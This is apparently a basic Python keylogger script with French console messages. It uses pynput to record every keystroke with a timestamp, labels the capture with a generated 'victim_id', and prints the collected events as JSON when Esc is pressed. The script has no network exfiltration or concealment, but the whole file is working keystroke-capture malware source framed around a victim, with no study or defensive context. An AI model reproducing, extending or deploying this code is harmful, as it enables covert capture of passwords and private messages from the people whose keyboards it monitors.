import uuid
import json
from pynput import keyboard
import time

victim_id = str(uuid.uuid4())
log = []

def on_press(key):
    timestamp = time.time()
    try:
        key_str = key.char
    except AttributeError:
        key_str = str(key)

    event = {
        "timestamp": timestamp,
        "key": key_str
    }

    log.append(event)

def on_release(key):
    if key == keyboard.Key.esc:
        print("Arrêt demandé.")
        # Affiche simplement les données en JSON
        print(json.dumps({
            "victim_id": victim_id,
            "events": log
        }, indent=4))
        return False

if __name__ == "__main__":
    print("DÉMARRAGE DU KEYLOGGER (version base)")
    print("Appuyez sur Échap pour arrêter.\n")

    listener = keyboard.Listener(on_press=on_press, on_release=on_release)
    listener.start()
    listener.join()
